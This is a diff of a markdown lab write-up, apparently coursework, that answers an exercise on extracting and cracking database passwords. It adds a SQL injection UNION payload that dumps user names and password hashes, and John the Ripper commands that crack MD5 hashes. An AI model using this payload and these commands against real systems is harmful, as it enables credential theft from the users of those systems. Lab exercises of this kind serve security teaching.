@@ -263,14 +263,25 @@ Result
 **Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
 <br>
 **Answer 3**:
-Attack by sqlinjection code
+### 1. Attack by sqlinjection code
 ```
 ' UNION SELECT user, password FROM users #
 ```
 ![Screenshot 2024-10-21 162619](https://github.com/user-attachments/assets/b34ce254-0e55-47c0-b24f-4032079409f7)
 
-In <br>
-First Name is username and Sure Name is password hashed by MD5 or SHA256
+In First Name is username and Sure Name is password hashed by MD5 or SHA256
+### 2. Run Jhon Ripper to crack file hash
+Create file hashes.txt
+![image](https://github.com/user-attachments/assets/9de36229-a6e9-48bf-8ccd-a1cc210a045c)
+
+```
+john --format=raw-md5 hashes.txt
+```
+### 3. Show the password to crack
+
+```
+john --show hashes.txt
+```
 
 
 
